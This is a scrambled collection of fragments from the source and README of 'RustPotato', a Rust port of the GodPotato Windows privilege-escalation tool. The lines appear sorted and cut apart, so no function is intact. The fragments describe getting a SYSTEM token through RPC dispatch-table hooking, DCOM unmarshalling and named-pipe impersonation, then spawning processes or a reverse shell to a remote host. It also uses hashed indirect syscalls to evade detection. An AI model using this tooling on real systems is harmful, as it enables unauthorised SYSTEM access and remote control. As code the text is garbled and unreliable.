" std::mem::size_of::<SystemHandleTableEntryInfoEx>(),"
" struct, each on a new line, formatted"
" structure, a critical component for managing RPC communications through the OXID Resolver."
" structures, which represent system handles"
" to execute after establishing the connection (e.g., ""cmd.exe"" or ""powershell.exe"")."
" trait, "
" with a custom function pointer, enabling interception and manipulation of specific RPC calls."
""")))"
"""), String::from("""
") -> Result<(), std::io::Error> {"
") -> Result<String, std::io::Error> {"
") is created with unrestricted access, serving as the endpoint for client connections."
") is provided, it uses the system token to execute the command."
"), RustPotato connects to a listener and executes commands through "
"), a binding context ("
", and "
", and applies the changes."
", etc."
", in which case the system searches for the DLL."
", the function stops further iteration."
", the system reads data from the current file position."
", the system writes data to the current file position."
", then utilizes the Exception Directory and"
", tokens for all"
"- [BeichenDream](https://github.com/BeichenDream) for his work on [GodPotato](https://github.com/BeichenDream/GodPotato), which made this port possible!"
". If successful, the read"
". If the read operation fails, an empty vector"
"/// (e.g., "
"/// - If memory allocation fails or the system query encounters an error, the function returns"
"/// - If no matching SID is found, adds the token to the list."
"/// - Iterates through each handle, identifying and processing tokens for the specified or all PIDs."
"/// - Skips invalid or inaccessible handles, as well as non-token objects."
"/// A handle to the process if successful, otherwise "
"/// A vector containing the read bytes, or an empty vector if the operation fails."
"/// Encapsulates GUID functionality, including conversion to/from byte representations."
"/// For more details on this approach, see MDsec's article on using the Exception Directory to resolve System Service Numbers:"
"/// In the context of this project, "
"/// In this project, "
"/// Locates a module by its hashed name, returning its base address and optionally populating its size."
"/// Represents a raw pointer to a Windows handle, designed for thread-safe operations."
"/// Represents a username tied to a token, including both the name and domain."
"/// Returns 0 on success, or the error code on failure."
"/// The base address of the module, or "
"/// The function dynamically allocates memory for the query results, automatically resizing"
"/// This function collects and processes tokens from system handles, filtering by a specified target PID"
"/// This function involves unsafe operations and raw pointers, which require careful handling."
"/// This function involves unsafe operations, including raw pointer dereferencing and direct system"
"/// This function retrieves the current attributes of the handle, updates them based on the"
"/// This function returns a handle to the heap used by the process, which is stored in the Process Environment Block (PEB)."
"/// This function sets up a named pipe with specified security attributes, buffer size,"
"/// This struct provides methods to initialize and trigger the unmarshalling process,"
"/// This structure encapsulates various attributes of a token, such as its Username, Security Identifier (SID),"
"/// and other options. It creates the pipe with both read and write handles, making it"
"/// and returns the SSN if a match is found. Additionally, the function updates the "
"/// during the impersonation of a pipe client. Once the token is stored, it can be accessed later"
"/// identity. It provides methods to set and retrieve the token, allowing the identity to be"
"/// impersonation level, integrity level, token type, and more."
"/// or all PIDs if no target is provided. For each valid token found, a user-provided callback is invoked"
"/// process, including a standard COM object ("
"/// retrieved during impersonation. By encapsulating the raw pointer, it ensures flexibility"
": A pointer to a variable that specifies the DLL characteristics (optional, can be "
": A pointer to the allocated memory block. If the allocation fails, the pointer will"
": Flags that control aspects of the allocation, such as whether to generate"
": Specifies which attributes to modify (e.g., "
": The command line string to be executed. If empty, execution is skipped."
": The desired access rights for the process handle, specified as an"
"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
"Always respect ethical guidelines and adhere to legal frameworks while conducting security research (or, honestly, in everything you do)."
"Below is an overview of its execution flow, highlighting key operations at each step:"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
"Name"" style."
"Permission is hereby granted, free of charge, to any person obtaining a copy"
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
"WD)"""
"Win32Pipes."""
"X}"", nt_status)"
"X}"", status),"
"X}"","
"[cfg(feature = ""verbose"")]"
"[cfg(target_arch = ""x86_64"")]"
"[derive(Clone, Copy)]"
"[derive(Clone, Copy, Debug)]"
"[derive(Clone, Copy, Debug, Eq, PartialEq)]"
"[derive(Clone, Default)]"
"[derive(Copy, Clone)]"
"[derive(Copy, Clone, Default)]"
"[derive(Debug, Clone)]"
"[derive(Debug, Clone, Copy)]"
"[derive(Debug, Clone, Copy, PartialEq, Eq)]"
"[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]"
"[derive(Default, Debug, Clone)]"
"[in, opt]"
"[in, out]"
"[out, opt]"
"[u8] = core::slice::from_raw_parts(name_addr as _, name_len)"
"[u8]) -> Result<GUID, Box<dyn core::error::Error>> {"
"[u8], pattern: "
"] Context successfully initialized"")"
"] Creating process via 'CreateProcessWithTokenW'"")"
"] DCOM object Flags: 0x{:x}"", flags)"
"] DCOM object GUID: {}"", guid.value)"
"] DCOM object IPID: {}"", ipid.value)"
"] DCOM object OID: 0x{:x}"", oid)"
"] DCOM object OXID: 0x{:x}"", oxid)"
"] DCOM object PublicRefs: {}"", public_refs)"
"] Dispatch table entries: {}"","
"] Dispatch table pointer: 0x{:016X}"","
"] Dispatch table restored to original function: 0x{:016X}"","
"] Dispatch table successfully hooked. New entry: 0x{:016X}"","
"] DispatchTable entry {}: 0x{:016X}"", i, entry as usize)"
"] Duplicated token as primary: 0x{:08X}"","
"] FmtStringOffset entry {}: {}"", i, offset)"
"] Hook function pointer: 0x{:016X}"","
"] Impersonation of pipe client successful"")"
"] Initializing pipe server"")"
"] Initiating unmarshalling trigger to connect with the pipe server"")"
"] MIDL_SERVER_INFO.DispatchTable: 0x{:016X}"","
"] MIDL_SERVER_INFO.FmtStringOffset: 0x{:016X}"","
"] MIDL_SERVER_INFO.ProcString: 0x{:016X}"","
"] Memory protection updated to PAGE_EXECUTE_READWRITE"")"
"] Named pipe created: {}"", server_pipe)"
"] PID = {}, Handle = 0x{:X}, Access = 0x{:X}"","
"] Pipe connection established"")"
"] Pipe handle: 0x{:08X}"", pipe_handle as usize)"
"] Pipe server thread terminated successfully."")"
"] Process output:"")"
"] RPC hook successfully installed"")"
"] RPC hook successfully removed"")"
"] RPC_SERVER_INTERFACE located at: 0x{:016X}"","
"] RPC_SERVER_INTERFACE.DispatchTable: 0x{:016X}"","
"] RPC_SERVER_INTERFACE.InterpreterInfo: 0x{:016X}"","
"] Retrieved {} handles"", handles.len())"
"] Reverted to self successfully"")"
"] Searching for RPC_SERVER_INTERFACE structure..."")"
"] Searching for System Token"")"
"] Sending termination signal to the pipe server."")"
"] System token found PID: {}, Token: 0x{:08X}, Username: {}"","
"] Test for list_process_token passed successfully."")"
"] Test for list_system_handles passed successfully."")"
"] Token Details:"")"
"] UseProtseqFunction parameter count: {}"","
"] Waiting for pipe connection"")"
"] combase.dll: Base Address: 0x{:016X}, Size: {}"","
"authors = [""safedv <https://github.com/safedv>""]"
"base64 = ""0.22.1"""
"byteorder = ""1.5.0"""
"c, h, p)"
"checksum = ""053c4c462dc91d3b1504c6fe5a726dd15e216ba718e84a0e46a88fbe5ded3515"""
"checksum = ""09ec2a7bb152e2252b53fa7803150007879548bc709c039df7627cabbd05d469"""
"checksum = ""0e4dccaaaf89514f546c693ddc140f729f958c247918a13380cccc6078391acc"""
"checksum = ""0eee52d38c090b3caa76c563b86c3a4bd71ef1a819287c19d586d7334ae8ed66"""
"checksum = ""147a5c80aabfbf0c7d901cb5895d1de30ef2907eb21fbbab29ca94c5b08b1a78"""
"checksum = ""1d1043d8214f791817bab27572aaa8af63732e11bf84aa21a45a78d6c317ae0e"""
"checksum = ""1fd0f2584146f6f2ef48085050886acf353beff7305ebd1ae69500e27c67f64b"""
"checksum = ""240948bc05c5e7c6dabba28bf89d89ffce3e303022809e73deaefe4f6ec56c66"""
"checksum = ""24d5b23dc417412679681396f2b49f3de8c1473deb516bd34410872eff51ed0d"""
"checksum = ""2bbd5b46c938e506ecbce286b6628a02171d56153ba733b6c741fc627ec9579b"""
"checksum = ""32a4622180e7a0ec044bb555404c800bc9fd9ec262ec147edd5989ccd0c02cd3"""
"checksum = ""37d3544b3f2748c54e147655edb5025752e2303145b5aefb3c3ea2c78b973bb0"""
"checksum = ""4cd9b125c486025df0eabcb585e62173c6c9eddcec5d117d3b6e8c30e2ee4d10"""
"checksum = ""589f6da84c646204747d1270a2a5661ea66ed1cced2631d546fdfb155959f9ec"""
"checksum = ""5c839a674fcd7a98952e593242ea400abe93992746761e38641405d28b00f419"""
"checksum = ""6ba6d44ec8c2591c134257ce647b7ea6b20335bf6379a27dac5f1641fcf59f99"""
"checksum = ""70ae51629bf965c5c098cc9e87908a3df5301051a9e087d6f9bef5c9771ed126"""
"checksum = ""712e227841d057c1ee1cd2fb22fa7e5a5461ae8e48fa2ca79ec42cfc1931183f"""
"checksum = ""72b3254f16251a8381aa12e40e3c4d2f0199f8c6508fbecb9d91f575e0fbb8c6"""
"checksum = ""8e9b5ad5ab802e97eb8e295ac6720e509ee4c243f69d781394014ebfe8bbfa0b"""
"checksum = ""9b724f72796e036ab90c1021d4780d4d3d648aca59e491e6b98e725b84e99973"""
"checksum = ""a4a660208db49e35faf57b37484350f1a61072f2a5becf0592af6015d9ddd4b0"""
"checksum = ""ac3b87c63620426dd9b991e5ce0329eff545bccbbb34f3be09ff6fb6ab51b7b6"""
"checksum = ""adb9e6ca4f869e1180728b7950e35922a7fc6397f7b641499e8f3ef06e50dc83"""
"checksum = ""b5aba8db14291edd000dfcc4d620c7ebfb122c613afb886ca8803fa4e128a20a"""
"checksum = ""dd04d41d93c4992d421894c18c8b43496aa748dd4c081bac0dc93eb0489272b6"""
"const AddrInfo,"
"const LargeInteger,"
"const PebLoaderData,"
"const RtlUserProcessParameters,"
"const SockAddr, namelen: i32) -> i32"
"const SystemHandleTableEntryInfoEx,"
"const _,"
"const c_void,"
"const core::ffi::c_void,"
"const i8, len: i32, flags: i32) -> i32"
"const i8,"
"const u16,"
"const u8, 8)"
"const u8, dll_length)"
"const u8, expected_length)"
"const u8, index: usize) -> Option<SystemHandleTableEntryInfoEx> {"
"copies of the Software, and to permit persons to whom the Software is"
"default_timeout,                   // Default timeout for pipe operations"
"define_nt_syscall!(NtClose, 0x40d6e69d)"
"define_nt_syscall!(NtCreateNamedPipeFile, 0x1da0062e)"
"define_nt_syscall!(NtDuplicateObject, 0x4441d859)"
"define_nt_syscall!(NtDuplicateToken, 0x8e160b23)"
"define_nt_syscall!(NtOpenFile, 0x46dde739)"
"define_nt_syscall!(NtOpenProcess, 0x4b82f718)"
"define_nt_syscall!(NtOpenProcessToken, 0x350dca99)"
"define_nt_syscall!(NtProtectVirtualMemory, 0x50e92888)"
"define_nt_syscall!(NtQueryInformationProcess, 0x8cdc5dc2)"
"define_nt_syscall!(NtQueryInformationToken, 0xf371fe4)"
"define_nt_syscall!(NtQueryObject, 0xc85dc9b4)"
"define_nt_syscall!(NtQuerySystemInformation, 0x7bc23928)"
"define_nt_syscall!(NtReadFile, 0xb2d93203)"
"define_nt_syscall!(NtSetInformationObject, 0x214310)"
"define_nt_syscall!(NtTerminateProcess, 0x4ed9dd4f)"
"define_nt_syscall!(NtWaitForSingleObject, 0xe8ac0c3c)"
"define_nt_syscall!(NtWriteFile, 0xe0d61db2)"
"dll_content, "
"edition = ""2024""   "
"epmapper""),"
"epmapper]""),"
"format!(""-{}"", id_auth_value)"
"format!(""-{}"", sub_auth)"
"furnished to do so, subject to the following conditions:"
"hints, "
"https://github.com/rust-lang/crates.io-index"""
"in the Software without restriction, including without limitation the rights"
"libc-print = ""0.1.23"""
"mut AddrInfo,"
"mut ClientId,"
"mut FD_SET,"
"mut IoStatusBlock,"
"mut ListEntry,"
"mut NtTib,"
"mut ObjectAttributes,"
"mut PEB,"
"mut ProcessInformation,"
"mut RpcDispatchTable,"
"mut RpcProtseqEndpoint,"
"mut RpcSyntaxIdentifier,"
"mut SECURITY_DESCRIPTOR, u32)> {"
"mut SecurityAttributes,"
"mut SockAddr,"
"mut StartupInfoW,"
"mut TIMEVAL,"
"mut UnicodeString,"
"mut Vec<ProcessToken>, process_token: ProcessToken) {"
"mut _),"
"mut _,"
"mut buffer_size,"
"mut bytes_available,"
"mut bytes_read,"
"mut bytes_returned,"
"mut c_void, _ppdsa_new_security: "
"mut c_void, alertable: bool, timeout: "
"mut c_void, dwFlags: u32, dwBytes: usize) -> "
"mut c_void, exit_status: i32) -> i32 {"
"mut c_void, p10)"
"mut c_void, p11)"
"mut c_void, p12)"
"mut c_void, p13)"
"mut c_void, p3)"
"mut c_void, p4)"
"mut c_void, p5)"
"mut c_void, p6)"
"mut c_void, p7)"
"mut c_void, p8)"
"mut c_void, p9)"
"mut c_void, u32> {"
"mut c_void,"
"mut c_void>,"
"mut child_stdout_read,"
"mut child_stdout_write,"
"mut client_id,      // Pass the client ID (target process ID)."
"mut core::ffi::c_void,"
"mut domain_size,                    // Size of the domain buffer"
"mut dup_handle,"
"mut duplicated,"
"mut i16, ch as i16)"
"mut i16, entrie_size as i16)"
"mut i16,"
"mut i8, buffer.len() as i32, 0)"
"mut i8, len: i32, flags: i32) -> i32"
"mut i8,"
"mut io_status_block,"
"mut io_status_block_read,"
"mut name_size,                      // Size of the name buffer"
"mut new_token,"
"mut object_attributes, // Provide the object attributes for the process."
"mut object_attributes,"
"mut old_protect,"
"mut pi,"
"mut pipe_name,"
"mut process_handle, // Pointer to the handle that will receive the process handle."
"mut process_info,"
"mut process_tokens, token)"
"mut read_pipe_handle,"
"mut region_size,"
"mut return_length,"
"mut return_size,"
"mut sa,"
"mut security_attributes,"
"mut security_descriptor_size,"
"mut self, c: "
"mut self, p: "
"mut self, source_string: "
"mut si,"
"mut startup_info,"
"mut status_block,"
"mut status_block_2,"
"mut stdin_read,"
"mut stdin_write,"
"mut stdout_read,"
"mut stdout_write,"
"mut token_handle,"
"mut u16,"
"mut u32, // SID type"
"mut u32,"
"mut u64,"
"mut u8, $f>(apicall_addr)"
"mut u8, function_hash: usize) -> "
"mut u8, module_size)"
"mut u8, size: usize) -> Vec<u8> {"
"mut u8, stream.len())"
"mut u8,"
"mut usize,"
"mut winapi::ctypes::c_void,"
"mut write_pipe_handle,"
"n----------------------------------"")"
"name = ""RustPotato"""
"name = ""base64"""
"name = ""byteorder"""
"name = ""libc"""
"name = ""libc-print"""
"name = ""proc-macro2"""
"name = ""quote"""
"name = ""syn"""
"name = ""unicode-ident"""
"name = ""winapi"""
"name = ""winapi-i686-pc-windows-gnu"""
"name = ""winapi-x86_64-pc-windows-gnu"""
"name = ""windows"""
"name = ""windows-core"""
"name = ""windows-implement"""
"name = ""windows-interface"""
"name = ""windows-result"""
"name = ""windows-strings"""
"name = ""windows-targets"""
"name = ""windows_aarch64_gnullvm"""
"name = ""windows_aarch64_msvc"""
"name = ""windows_i686_gnu"""
"name = ""windows_i686_gnullvm"""
"name = ""windows_i686_msvc"""
"name = ""windows_x86_64_gnu"""
"name = ""windows_x86_64_gnullvm"""
"name = ""windows_x86_64_msvc"""
"of this software and associated documentation files (the ""Software""), to deal"
"opt-level = ""z"""
"panic = ""abort"""
"process_token_node.sid, "
"pub fn connect_socket(sock: SOCKET, addr: "
"pub fn format_named_pipe_string(process_id: usize, pipe_id: u32) -> Vec<u16> {"
"pub fn get_process_handle(pid: i32, desired_access: u32) -> Option<"
"pub fn get_ssn(hash: usize, addr: "
"pub fn list_process_tokens<F>(target_pid: Option<i32>, mut callback: F)"
"pub fn read_memory(process: HANDLE, base_address: "
"pub type CreateProcessWithTokenW = unsafe extern ""system"" fn("
"pub type PeekNamedPipe = unsafe extern ""system"" fn("
"pub type RpcDispatchFunction = Option<unsafe extern ""system"" fn(message: "
"pub unsafe fn ldr_module(module_hash: u32, out_module_size: Option<"
"self, f: "
"self, handle: "
"self, process_handle: "
"self, writer: "
"self,"
"self.bind_ctx, None)"
"source = ""registry"
"str, h: Option<"
"str, htoken: "
"str, p: u16, c: "
"str, port: u16) -> i32 {"
"str,"
"str>, p: Option<u16>) -> Option<()> {"
"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
"type CloseSocketFunc = unsafe extern ""system"" fn(s: SOCKET) -> i32"
"type ConnectFunc = unsafe extern ""system"" fn(s: SOCKET, name: "
"type FreeAddrInfoFunc = unsafe extern ""system"" fn(res: "
"type GetAddrInfoFunc = unsafe extern ""system"" fn("
"type HtonsFunc = unsafe extern ""system"" fn(hostshort: u16) -> u16"
"type InetAddrFunc = unsafe extern ""system"" fn(cp: "
"type IoctlsocketFunc = unsafe extern ""system"" fn(s: SOCKET, cmd: i32, argp: "
"type LdrLoadDll = unsafe extern ""system"" fn("
"type RecvFunc = unsafe extern ""system"" fn(s: SOCKET, buf: "
"type SelectFunc = unsafe extern ""system"" fn("
"type SendFunc = unsafe extern ""system"" fn(s: SOCKET, buf: "
"type SocketFunc = unsafe extern ""system"" fn(af: i32, socket_type: i32, protocol: i32) -> SOCKET"
"type WSACleanupFunc = unsafe extern ""system"" fn() -> i32"
"type WSAGetLastErrorFunc = unsafe extern ""system"" fn() -> i32"
"unsafe extern ""C"" {"
"use byteorder::{ReadBytesExt, WriteBytesExt}"
"use crate::def::{BAD_HANDLE, MidlServerInfo, RpcDispatchTable, RpcServerInterface}"
"use crate::objref::{DualStringArray, ObjRef, SecurityBinding, Standard, StringBinding}"
"use crate::utils::{GUID, WindowsIdentity}"
"use crate::utils::{Sid, TokenUsername}"
"use crate::utils::{Sunday, create_security_descriptor, read_memory}"
"use crate::{_print, def::TowerProtocol, utils::GUID}"
"use crate::{resolve_functions, win32::ldr::ldr_module}"
"use std::alloc::{Layout, alloc, dealloc}"
"use std::ffi::{OsStr, OsString}"
"use std::io::{Cursor, Read, Write}"
"use std::io::{Error, ErrorKind}"
"use std::os::windows::ffi::{OsStrExt as _, OsStringExt as _}"
"use std::sync::atomic::{AtomicBool, Ordering}"
"use std::sync::{Arc, Mutex, OnceLock}"
"use super::def::{IoStatusBlock, LargeInteger, nt_current_teb}"
"use super::def::{ProcessInformation, StartupInfoW}"
"use winapi::um::securitybaseapi::{GetSidSubAuthority, GetSidSubAuthorityCount}"
"use winapi::um::winnt::{PSID, SECURITY_DESCRIPTOR}"
"use windows::core::{IUnknown, Interface}"
"version = ""0.1.0"""
"version = ""0.1.23"""
"version = ""0.2.0"""
"version = ""0.2.169"""
"version = ""0.22.1"""
"version = ""0.3.9"""
"version = ""0.4.0"""
"version = ""0.52.6"""
"version = ""0.58.0"""
"version = ""1.0.14"""
"version = ""1.0.38"""
"version = ""1.0.92"""
"version = ""1.5.0"""
"version = ""2.0.92"""
"winapi = {version = ""0.3.9"", features =["
"windows = { version = ""0.58.0"", features = ["
"windows-core = ""0.58.0"""
"{}"", self.domain, self.name)"
"}"", _e)"
"}"", elevation))"
"}"", hr)"
"}"", level))"
"}"", ntdll.nt_close.address())"
"}"", ntdll.nt_create_named_pipe_file.address())"
"}"", ntdll.nt_duplicate_object.address())"
"}"", ntdll.nt_duplicate_token.address())"
"}"", ntdll.nt_open_file.address())"
"}"", ntdll.nt_open_process.address())"
"}"", ntdll.nt_open_process_token.address())"
"}"", ntdll.nt_protect_virtual_memory.address())"
"}"", ntdll.nt_query_information_process.address())"
"}"", ntdll.nt_query_information_token.address())"
"}"", ntdll.nt_query_object.address())"
"}"", ntdll.nt_query_system_information.address())"
"}"", ntdll.nt_read_file.address())"
"}"", ntdll.nt_set_information_object.address())"
"}"", ntdll.nt_terminate_process.address())"
"}"", ntdll.nt_wait_for_single_object.address())"
"}"", ntdll.nt_write_file.address())"
"}"", t))"
$hash
$name
'static Advapi32 {
'static Kernel32 {
'static NtDll {
'static Winsock {
'static str
(0u16.to_le_bytes()))
(addr_info.ai_addr as 
(buffer.as_ptr() as 
(core::mem::size_of::<RpcServerInterface>() as u32).to_le_bytes())
(offset as 
(rpc_server_interface.dispatch_table as 
(rpc_server_interface.interpreter_info as 
(self
(self.dispatch_table_ptr.add(offset) as 
(tmp as 
) -> Option<(
) -> i32
) -> i32 {
) => {
) and provides
) and the server is not already running (
) for retrieving endpoint data.
) needed to
) used to create the reverse shell process with the appropriate privileges.
) with elevated privileges.
) with modified parameters.
) with redirected I/O using the provided process token.
) with the last occurrence indices for all possible characters.
).ok()
- [Resolving System Service Numbers Using The Exception Directory by MDsec](https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/) for their insights on resolving SSNs.
. It receives a 
. RustPotato is a personal learning project focused on exploring Rust and Windows internals. Use it responsibly
.globl isyscall
.section .text
// Data structures for Winsock
// Define function types for Winsock functions
// Definition of LIST_ENTRY
// Definition of UNICODE_STRING
// Utility function for checking null terminator for u8 and u16
// pub static mut NTDLL: RwLock<UnsafeCell<Option<NtDll>>> = RwLock::new(UnsafeCell::new(None))
/// 
///   
///       or if the new token has a higher impersonation level and elevation.
///     - Ensures the token is not restricted before replacing.
///     - Replaces the existing token if its impersonation level is the same
///   Security Descriptor Definition Language (SDDL).
///   an empty vector.
///   be 
///   exceptions on failure.
///   processes are retrieved.
///   returns 
/// - 
/// - A 
/// - A pointer to the created 
/// - Calls the user-provided callback for each valid 
/// - Closes the new token handle if it does not qualify for replacement.
/// - Ensures each unique PID is handled only once per iteration.
/// - Ensures safe comparison of token SIDs without using 
/// - If a matching SID is found:
/// - If the module is found and 
/// - Iterates through the existing tokens to find a matching SID.
/// - Memory is properly allocated and deallocated using Rust's 
/// - Prevents duplication by checking for existing SIDs in the token list.
/// - Reads the output from the process's standard output stream until it terminates.
/// - Retrieves system handles via 
/// - Returns 
/// - Sets up a pipe to capture the standard output and error streams of the process.
/// - Skips processing if the provided token handle is null.
/// - The SSN (System Service Number) of the specified syscall if a match is found.
/// - The caller must ensure the provided handle is valid.
/// - The size of the security descriptor in bytes.
/// - This function internally uses 
/// - Uses the provided token to create the process with 
/// A 
/// A fake COM object that implements the 
/// A handle to the current process.
/// API.
/// Accessor for the 
/// Adds a process token to the list or updates an existing one if conditions are met.
/// Allocates a block of memory from the specified heap. The allocated memory is uninitialized.
/// An 
/// Atomic flag to ensure initialization happens only once.
/// Behavior:
/// Computes the DJB2 hash for the given buffer
/// Connects a socket to a given address and port.
/// Creates a named pipe and returns handles for reading and writing.
/// Creates a new TCP socket for network communication.
/// Creates a process with the specified token and retrieves its output via a pipe.
/// Creates a security descriptor from a string descriptor.
/// Ensures the 
/// Executes a reverse shell by connecting to a remote server and launching a specified process
/// Export Address Table to identify the specified syscall. It matches the syscall by hash
/// Find the Thread Environment Block (TEB) of the current process on x86_64
/// Finds a function by its hash from the export directory of a module.
/// Formats a named pipe string and stores it in a 
/// Gets the last error value for the current thread.
/// Global mutable instance of advapi32.dll.
/// Global mutable instance of the ntdll.
/// Helper function to convert a hex digit (0-15) into its corresponding ASCII character.
/// Implements the Sunday string search algorithm.
/// Initializes the 
/// Initializes the Winsock library for network operations on Windows.
/// It also implements the 
/// It mimics the behavior of the 
/// It will only print the message if the feature 
/// Iterates through system handles and retrieves tokens for specified or all processes.
/// Loads a DLL into the address space of the calling process.
/// Macro for conditional printing using 
/// Macro to define a syscall structure and its associated implementations.
/// Modifies attributes of a specified handle using the NtSetInformationObject API.
/// Parameters:
/// Provides functionality for unmarshalling objects using DCOM.
/// Provides methods to parse a SID from bytes or a pointer.
/// Reads a UTF-16 string from a byte stream.
/// Reads memory from a specified process at the given address.
/// Represents a GUID (Globally Unique Identifier).
/// Represents a Security Identifier (SID).
/// Represents a Windows security identity with an optional token.
/// Represents a dual string array in the OBJREF structure.
/// Represents a handler for setting up RPC bindings dynamically.
/// Represents a security binding in the OBJREF structure.
/// Represents a security token associated with a process.
/// Represents a string binding in the OBJREF structure.
/// Represents a trigger mechanism for unmarshalling objects using DCOM.
/// Represents an OBJREF structure with GUID and standard object reference details.
/// Represents the 
/// Represents the main context for managing RustPotato operations.
/// Represents the standard structure within an OBJREF.
/// Represents the type of an OBJREF structure.
/// Represents various protocols used in DCOM communication.
/// Resolves a hostname to an IPv4 address.
/// Retrieves a handle to a process with the specified PID and desired access rights using the NT
/// Retrieves a handle to the current process.
/// Retrieves a handle to the process heap.
/// Retrieves a list of system handles using 
/// Retrieves the NT headers from the base address of a module.
/// Retrieves the System Service Number (SSN) and the address for a specified syscall.
/// Returns 
/// Returns a pointer to 
/// Returns a static reference to the 
/// Returns the IPv4 address as a 
/// Returns the function's address or null if not found.
/// Returns the socket descriptor (SOCKET) or an error code on failure.
/// The Sunday algorithm is an efficient pattern matching algorithm
/// The corresponding ASCII character as a 
/// The generated struct will have the following fields:
/// The macro takes a format string and optional arguments.
/// This function attempts to read 
/// This function converts a string representation of a security descriptor
/// This function generates a named pipe path in the format:
/// This function opens a handle to a target process by specifying its process ID (PID) and the
/// This function performs the following actions:
/// This function queries the system for extended handle information and returns a vector
/// This function retrieves the last error code set in the Thread Environment Block (TEB).
/// This function scans the loaded modules in memory to locate 
/// This function uses the 
/// This macro generates a struct with the given name and a specified hash value.
/// This struct is thread-safe and is typically used in conjunction with synchronization
/// This structure encapsulates components required for initiating the unmarshalling
/// This structure is designed to store and manage a security token associated with a Windows
/// This structure wraps a raw pointer to a Windows handle (
/// This utility handles the deserialization of byte streams into COM objects and
/// Type alias for pointer to 
/// Type definition for the LdrLoadDll function.
/// Type definition for the RtlAllocateHeap function.
/// a safe context.
/// allowing interaction with remote COM objects or servers.
/// and a moniker (
/// and stores the UTF-16 encoded string in a 
/// be used in various Windows API calls that require access control.
/// calls. Ensure that the parameters passed to the function are valid and the function is called in
/// created process are captured via a pipe and returned as a 
/// currently open across all processes.
/// data is returned as a 
/// desired access rights. The syscall 
/// for thread-based operations while maintaining Rust's safety guarantees.
/// function initializes the required structures (
/// https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/
/// identified by 
/// implemented to allow safe transfer and sharing of handles across threads.
/// interacts with DCOM to reconstruct interfaces for further use.
/// into a binary security descriptor. The resulting security descriptor can
/// is returned.
/// is then used to shift the search window based on mismatched characters.
/// make the system call.
/// of 
/// primitives like 
/// provided 
/// ready for inter-process communication using the 
/// security context of the specified token. The standard output and error streams of the
/// struct.
/// that preprocesses the pattern into an occurrence table. This table
/// the buffer if the initially allocated memory is insufficient. Rust's 
/// to process or filter the token. If the callback returns 
/// to spawn new processes with the elevated privileges of the system account.
/// used for safe memory allocation and deallocation.
/// used in privileged operations such as creating processes or accessing restricted resources.
/// utilities to safely work with it in a Rust context. The 
/target
0x12345ABC
0xABCDE123
0xabcdef12
: A 
: A byte slice representing the pattern to search for.
: A byte slice representing the text to search within.
: A function or closure to process each 
: A handle to the heap from which the memory will be allocated.
: A handle to the object whose attributes are being modified.
: A handle to the security token used to create the new process.
: A handle to the target process.
: A mutable pointer to a pointer where the newly created binding structure will be stored.
: A mutable reference that will be updated with the address of the matched function in 
: A mutable reference to a vector of 
: A pointer to a 
: A pointer to a variable that receives the handle to the loaded DLL.
: A raw pointer to the token handle to be stored.
: A slice of bytes representing the serialized object.
: A string describing the security descriptor in
: An optional 
: An optional port for the reverse shell listener.
: An optional string representing the host for the reverse shell listener.
: Enables detailed logging during execution.
: Handle to the target process's token.
: Handle to the target process.
: Handle to the token being checked or upgraded.
: Handle to the token being queried.
: Process ID (PID) of the target process.
: Reserved for future use (currently unused).
: Retrieves the stored token for use in privileged operations.
: Specifies the new values for the attributes in the mask.
: The 
: The actual handle to the token being managed.
: The base address from which to read memory.
: The binding context used to resolve the moniker.
: The command line string to execute in the new process.
: The hash value of the syscall to locate.
: The moniker associated with the COM object.
: The number of bytes to allocate from the heap.
: The number of bytes to read.
: The pipe ID to be included in the pipe name.
: The process ID of the target process.
: The process ID to be included in the pipe name.
: The standard COM object implementing 
: Used to store a raw handle to a security token.
= OBJ_INHERIT
= endpoint.len() 
= io_status_block.information
= pattern.len()
= sent as u32
ADVAPI32_PTR }
AccessMask
Advapi32
Arc<Mutex<WindowsIdentity>>
Basic build
Build with verbose logging
CLIENT_ID
CoUnmarshalInterface
Copyright (c) 2024 Davide Valitutti
Create Named Pipe
CreateProcessWithTokenW
DCOM
Default
Delegation
Description:
Device
DllCharacteristics
DllHandle
DllName
DllPath
DualStringArray
Err(String)
Err(std::io::Error)
Err(u32)
Establish a Reverse Shell
Examples:
Execute Command or Establish Reverse Shell
Execute a Command
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
GLOBAL_CONTEXT
GetSidSubAuthorityCount(sid_ptr) as usize
HANDLE
HANDLE_FLAG_INHERIT
HANDLE_FLAG_PROTECT_FROM_CLOSE
Hook RPC Dispatch Table
IBindCtx
IMoniker
IO_STATUS_BLOCK
IUnknown
ImageNtHeaders
Impersonate Client
ImpersonateNamedPipeClient
Impersonation
Indirect NTAPI
Initialize and Hook RPC Context
K32_PTR }
LARGE_INTEGER
Locate 
MIT License
NT AUTHORITY
NTDLL
NTDLL_PTR }
NULL
NamedPipe
None
Note:
NtCreateNamedPipeFile
NtDll
NtDuplicateObject
NtGetLastError
NtOpenProcess
NtProcessHeap
NtQueryObject
NtQuerySystemInformation
NtSetInformationObject
NtSyscall
OBJECT_ATTRIBUTES
OICI
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
ObjRef
Ok(())
Ok(HANDLE)
Ok(String)
Option
Options:
PAGE_EXECUTE
PAGE_READWRITE
Primary
ProcessToken
RPCSS
RPC_DISPATCH_TABLE
RPC_SERVER_INTERFACE
RawHandle
Restore RPC Dispatch Table
Restore State and Cleanup
Retrieve SYSTEM Token
RustPotato
RustPotato provides the following features:
RustPotatoContext
RustPotatoUnmarshalTrigger
SECURITY_DESCRIPTOR
SOFTWARE.
STATUS_BUFFER_TOO_SMALL
SYSTEM
SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
SeImpersonatePrivilege
SecurityBinding
Send
Some(
Some(IntegrityLevel)
Some(ProcessToken)
Some(RawHandle)
Some(RustPotatoUnmarshalTrigger)
